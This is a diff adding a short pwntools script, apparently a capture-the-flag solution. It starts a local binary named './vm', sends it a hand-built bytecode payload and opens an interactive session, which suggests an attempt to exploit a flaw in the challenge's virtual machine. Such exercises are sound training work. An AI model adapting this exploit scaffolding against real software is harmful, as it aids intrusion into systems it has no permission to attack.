@@ -1,0 +1,15 @@
+
+from pwn import *
+
+p = process("./vm")
+
+payload = bytes([
+    0x10, 0x00, 0xff,
+    0x10, 0x01, 0xef,
+    0x30, 0x00, 0x01,
+    0xff
+])
+
+p.send(payload)
+
+p.interactive()
